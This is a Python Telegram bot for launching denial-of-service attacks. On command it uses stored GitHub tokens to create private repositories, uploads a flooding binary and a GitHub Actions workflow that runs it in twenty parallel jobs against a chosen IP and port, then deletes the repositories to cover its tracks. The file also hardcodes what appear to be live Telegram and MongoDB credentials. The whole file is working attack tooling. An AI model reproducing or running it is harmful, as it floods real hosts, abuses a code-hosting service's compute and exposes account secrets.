import base64
import datetime
import random
import string
import threading
import time
import logging
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from pymongo import MongoClient
import os

# -----------------------
# CONFIG
# -----------------------
TELEGRAM_TOKEN = "6704057021:AAH16jkATbO4Ha-bk0-QIj9Oq6hw1Ir_8mk"
MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"  # Replace with your MongoDB URI (e.g., Atlas)
C_FILE_PATH = "/workspaces/ddos/soul"

FIXED_THREADS = "900"
DB_NAME = "bot_db"
ADMIN_COLLECTION = "admins"
ACCOUNTS_COLLECTION = "accounts"
SEED_ADMIN_ID = 5759284972  # Fallback seed if DB empty

WORKFLOW_TEMPLATE = """name: Attack Workflow
on:
  push:
    branches: [ main ]
jobs:
  attack:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        job: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
              11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
              ]
    steps:
      - uses: actions/checkout@v3
      - name: Compile C code
        run: chmod +x *
      - name: Run attack
        run: ./soul {ip} {port} {time} {threads}
"""

# -----------------------
# MONGODB SETUP
# -----------------------
try:
    client = MongoClient(MONGO_URI)
    db = client[DB_NAME]
    logging.info("Connected to MongoDB successfully.")
except Exception as e:
    logging.error(f"Failed to connect to MongoDB: {e}")
    client = None
    db = None

ADMIN_IDS = []
GITHUB_ACCOUNTS = []  # List of {"token": "...", "org_name": "..."}

def load_admins():
    global ADMIN_IDS
    if db is None:
        ADMIN_IDS = [SEED_ADMIN_ID]
        return
    admins = db[ADMIN_COLLECTION].find({}, {"user_id": 1})
    ADMIN_IDS = [doc["user_id"] for doc in admins]
    if not ADMIN_IDS:
        # Seed if empty
        db[ADMIN_COLLECTION].insert_one({"user_id": SEED_ADMIN_ID})
        ADMIN_IDS = [SEED_ADMIN_ID]
        logging.info(f"Seeded admin {SEED_ADMIN_ID} in DB.")

def load_accounts():
    global GITHUB_ACCOUNTS
    if db is None:
        GITHUB_ACCOUNTS = []
        return
    accounts = db[ACCOUNTS_COLLECTION].find({}, {"token": 1, "org_name": 1})
    GITHUB_ACCOUNTS = [doc for doc in accounts]
    logging.info(f"Loaded {len(GITHUB_ACCOUNTS)} GitHub accounts from DB.")

# Load on startup
load_admins()
load_accounts()

# -----------------------
# TRACKING CURRENT ATTACK
# -----------------------
current_attack = {
    "ip": None,
    "port": None,
    "time": None,
    "running": False,
    "repos": [],  # List of {"url": str, "token": str} for deletion
    "thread": None
}

# -----------------------
# HELPER FUNCTIONS
# -----------------------
def is_admin(user_id):
    return user_id in ADMIN_IDS

def github_headers(token):
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def generate_repo_name(prefix="attack"):
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

def create_personal_repo(token, repo_name, description=""):
    headers = github_headers(token)
    api_url = "https://api.github.com/user/repos"
    data = {"name": repo_name, "private": True, "description": description, "auto_init": True}
    r = requests.post(api_url, headers=headers, json=data)
    if r.status_code == 201:
        return r.json()
    else:
        logging.error(f"Personal repo creation failed: {r.text}")
        return {"error": r.json() if r.content else "Unknown error"}

def create_org_repo(token, org_name, repo_name, description=""):
    headers = github_headers(token)
    api_url = f"https://api.github.com/orgs/{org_name}/repos"
    data = {"name": repo_name, "private": True, "description": description, "auto_init": True}
    r = requests.post(api_url, headers=headers, json=data)
    if r.status_code == 201:
        return r.json()
    else:
        logging.error(f"Org repo creation failed for {org_name}: {r.text}")
        return {"error": r.json() if r.content else "Unknown error"}

def upload_file(owner, repo, token, file_path, content, commit_message="Add file"):
    headers = github_headers(token)
    content_b64 = base64.b64encode(content.encode("utf-8")).decode("utf-8")
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{file_path}"
    data = {"message": commit_message, "content": content_b64}
    r = requests.put(url, headers=headers, json=data)
    return r.json() if r.status_code in [200, 201] else {"error": r.json() if r.content else "Unknown error"}

def upload_c_file(owner, repo, token, file_path, commit_message="Add C file"):
    try:
        with open(file_path, "rb") as f:
            content = base64.b64encode(f.read()).decode("utf-8")
        file_name = file_path.split("/")[-1]
        url = f"https://api.github.com/repos/{owner}/{repo}/contents/{file_name}"
        headers = github_headers(token)
        data = {"message": commit_message, "content": content}
        r = requests.put(url, headers=headers, json=data)
        return r.json() if r.status_code in [200, 201] else {"error": r.json() if r.content else "Unknown error"}
    except Exception as e:
        logging.error(f"Failed to upload C file: {e}")
        return {"error": str(e)}

def upload_workflow(owner, repo, token, ip, port, time_val, threads):
    workflow_path = ".github/workflows/attack.yml"
    workflow_content = WORKFLOW_TEMPLATE.format(ip=ip, port=port, time=time_val, threads=threads)
    return upload_file(owner, repo, token, workflow_path, workflow_content, "Add attack workflow")

def delete_repo(url, token):
    try:
        owner_repo = "/".join(url.split("/")[-2:])
        headers = github_headers(token)
        r = requests.delete(f"https://api.github.com/repos/{owner_repo}", headers=headers)
        if r.status_code == 204:
            logging.info(f"Deleted repo: {owner_repo}")
            return True
        else:
            logging.error(f"Failed to delete {owner_repo}: {r.text}")
            return False
    except Exception as e:
        logging.error(f"Error deleting repo {url}: {e}")
        return False

def add_admin_to_db(user_id):
    if db is not None:
        db[ADMIN_COLLECTION].update_one({"user_id": user_id}, {"$setOnInsert": {"user_id": user_id}}, upsert=True)
        if user_id not in ADMIN_IDS:
            ADMIN_IDS.append(user_id)

def remove_admin_from_db(user_id):
    if db is not None:
        db[ADMIN_COLLECTION].delete_one({"user_id": user_id})
        if user_id in ADMIN_IDS:
            ADMIN_IDS.remove(user_id)

def add_account_to_db(token, org_name):
    if db is not None and token.startswith("ghp_") and org_name.strip():
        db[ACCOUNTS_COLLECTION].update_one({"token": token}, {"$set": {"token": token, "org_name": org_name.strip()}}, upsert=True)
        if {"token": token, "org_name": org_name} not in GITHUB_ACCOUNTS:
            GITHUB_ACCOUNTS.append({"token": token, "org_name": org_name})
        return True
    return False

# -----------------------
# TELEGRAM COMMANDS
# -----------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🚀 Welcome!\n\n"
        "Commands:\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/stop - Stop current attack\n"
        "/status - Show attack status\n"
        "/add <id> - Add admin (DB)\n"
        "/remove <id> - Remove admin (DB)\n"
        "/addaccount <token> <org_name> - Add GitHub account (DB)\n"
        "/listaccounts - List GitHub accounts\n"
        "/help - Show this message\n\n"
        "Note: Add GitHub accounts first with /addaccount!"
    )
    await update.message.reply_text(msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return

    if current_attack["running"]:
        await update.message.reply_text("⚠️ An attack is already running.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    if not GITHUB_ACCOUNTS:
        await update.message.reply_text("❌ No GitHub accounts in DB. Add one with /addaccount <token> <org_name>")
        return

    ip, port, time_val = context.args
    repo_name = generate_repo_name()
    description = f"Attack repo for {ip}:{port} {time_val}s with {FIXED_THREADS} threads"

    repos_created = []
    failed_accounts = []

    # Use all accounts
    for account in GITHUB_ACCOUNTS:
        token = account["token"]
        org_name = account["org_name"]

        # Create personal repo
        personal = create_personal_repo(token, repo_name, description)
        if "html_url" in personal:
            owner = personal["owner"]["login"]
            upload_c_file(owner, repo_name, token, C_FILE_PATH)
            upload_workflow(owner, repo_name, token, ip, port, time_val, FIXED_THREADS)
            repos_created.append({"url": personal["html_url"], "token": token})
        else:
            failed_accounts.append(f"Personal repo for token {token[:10]}...")

        # Create org repo
        org = create_org_repo(token, org_name, repo_name, description)
        if "html_url" in org:
            upload_c_file(org_name, repo_name, token, C_FILE_PATH)
            upload_workflow(org_name, repo_name, token, ip, port, time_val, FIXED_THREADS)
            repos_created.append({"url": org["html_url"], "token": token})
        else:
            failed_accounts.append(f"Org repo for {org_name} with token {token[:10]}...")

    if not repos_created:
        await update.message.reply_text(f"❌ Failed to create any repos.\nErrors: {failed_accounts}")
        return

    current_attack.update({
        "ip": ip, "port": port, "time": int(time_val),
        "running": True, "repos": repos_created
    })

    msg = f"🔥 Attack started using {len(GITHUB_ACCOUNTS)} account(s)!\nRepos created: {len(repos_created)}\n{[r['url'] for r in repos_created]}"
    if failed_accounts:
        msg += f"\nFailed: {', '.join(failed_accounts)}"
    await update.message.reply_text(msg)

    # Countdown + auto-delete repos
    def countdown():
        remaining = int(time_val)
        while remaining > 0 and current_attack["running"]:
            time.sleep(1)
            remaining -= 1
        # Delete repos after attack
        for repo_info in current_attack["repos"]:
            delete_repo(repo_info["url"], repo_info["token"])
        current_attack.update({"running": False, "repos": [], "ip": None, "port": None, "time": None})

    t = threading.Thread(target=countdown, daemon=True)
    current_attack["thread"] = t
    t.start()

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return
    current_attack["running"] = False
    await update.message.reply_text("🛑 Attack stopped. Repos will be deleted shortly.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not current_attack["running"]:
        await update.message.reply_text("⚡ No attack running.")
        return
    await update.message.reply_text(
        f"⚡ Attack Status\nIP: {current_attack['ip']}\n"
        f"Port: {current_attack['port']}\nTime: {current_attack['time']}s\n"
        f"Repos: {[r['url'] for r in current_attack['repos']]}"
    )

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /add <id>")
        return
    try:
        new_id = int(context.args[0])
        add_admin_to_db(new_id)
        await update.message.reply_text(f"✅ Added {new_id} as admin in DB.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID. Must be an integer.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id == SEED_ADMIN_ID:  # Protect seed admin
            await update.message.reply_text("❌ Cannot remove seed admin.")
            return
        remove_admin_from_db(rem_id)
        await update.message.reply_text(f"✅ Removed {rem_id} from admins in DB.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID. Must be an integer.")

async def add_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /addaccount <token> <org_name>")
        return
    token = context.args[0].strip()
    org_name = context.args[1].strip()
    if add_account_to_db(token, org_name):
        await update.message.reply_text(f"✅ Added GitHub account (token: {token[:10]}..., org: {org_name}) to DB.")
    else:
        await update.message.reply_text("❌ Invalid token (must start with ghp_) or org_name.")

async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ You are not authorized.")
        return
    if not GITHUB_ACCOUNTS:
        await update.message.reply_text("📭 No accounts in DB.")
        return
    msg = "📋 GitHub Accounts:\n"
    for i, acc in enumerate(GITHUB_ACCOUNTS, 1):
        msg += f"{i}. Token: {acc['token'][:10]}... | Org: {acc['org_name']}\n"
    await update.message.reply_text(msg)

# -----------------------
# MAIN
# -----------------------
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("add", add_admin))
    app.add_handler(CommandHandler("remove", remove_admin))
    app.add_handler(CommandHandler("addaccount", add_account))
    app.add_handler(CommandHandler("listaccounts", list_accounts))
    print("🤖 Bot running. Loaded admins:", ADMIN_IDS, "| Accounts:", len(GITHUB_ACCOUNTS))
    app.run_polling()